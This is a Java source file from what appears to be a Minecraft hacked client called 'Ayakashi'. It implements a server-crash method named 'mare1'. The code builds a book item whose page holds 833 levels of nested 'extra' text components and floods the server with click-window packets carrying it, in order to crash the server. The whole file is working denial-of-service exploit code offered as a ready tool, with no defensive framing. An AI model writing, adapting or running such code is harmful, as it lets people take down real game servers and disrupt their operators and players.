package Ayakashi.methods.impl;

import Ayakashi.helpers.ChatHelper;
import Ayakashi.methods.Crash;
import Ayakashi.methods.CrashInfo;
import Ayakashi.mods.notifications.Notification;
import Ayakashi.mods.notifications.NotificationManager;
import Ayakashi.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C0EPacketClickWindow;

@CrashInfo(
        name = "mare1"
)
public class CrashMare1 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Ayakashi"), "Mare method started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));
        (new Thread(() -> {
            for (int i = 0; i < packets; ++i) {
                NBTTagCompound tag = new NBTTagCompound();
                NBTTagList list = new NBTTagList();
                StringBuilder value = new StringBuilder();
                value.append("{");
                int bvalue = 833;

                int i2;
                for (i2 = 0; i2 < bvalue; ++i2) {
                    value.append("extra:[{");
                }

                for (i2 = 0; i2 < bvalue; ++i2) {
                    value.append("text:\u017F}],");
                }
                value.append("text:\u017F}");
                list.appendTag(new NBTTagString(value.toString()));
                tag.setString("author", Minecraft.getMinecraft().getSession().getUsername());
                tag.setString("title", "Ayakashi");
                tag.setByte("resolved", (byte) 1);
                tag.setTag("pages", list);
                ItemStack book = new ItemStack(Items.writable_book);
                book.setTagCompound(tag);
                Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 1, 0, 1, book, (short) 0));
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
